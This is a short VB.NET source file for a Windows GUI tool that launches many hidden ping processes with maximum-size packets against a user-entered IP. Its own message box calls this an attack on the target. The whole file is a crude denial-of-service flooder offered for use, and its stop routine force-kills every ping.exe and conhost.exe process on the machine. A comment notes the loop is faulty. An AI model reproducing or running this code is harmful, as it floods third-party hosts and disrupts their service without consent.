﻿Public Class Main
    Public RAE
    Private Sub START__Click(sender As Object, e As EventArgs) Handles START_.Click
        On Error Resume Next
        For RAE = 1 To 1000000000 '相当于0 to 100
            RAE = RAE + 1
            If RAE = MOPous.Text Then
                GoTo Nexy
            ElseIf RAE < MOPous.Text Then
                Shell("Ping " + IP_DATA.Text + " -t -l 65500", 0) '所以这里的FOR有问题
            ElseIf RAE > MOPous.Text Then
                GoTo Nexy
            End If
        Next
Nexy:
        MsgBox("成功！已经开始攻击目标IP! 线程数量：" + MOPous.Text, 64, "WINDOWS PING")
    End Sub

    Private Sub STOP__Click(sender As Object, e As EventArgs) Handles STOP_.Click
        On Error Resume Next
        Shell("TASKKILL /IM PING.EXE /F", 0)
        Shell("TASKKILL /IM CONHOST.EXE /F", 0)
        MsgBox("成功停止所有攻击线程！", 64, "WINDOWS PING")
    End Sub

    Private Sub End__Click(sender As Object, e As EventArgs) Handles End_.Click
        Shell("TASKKILL /IM PING.EXE /F", 0)
        Shell("TASKKILL /IM CONHOST.EXE /F", 0)
        End
    End Sub
End Class
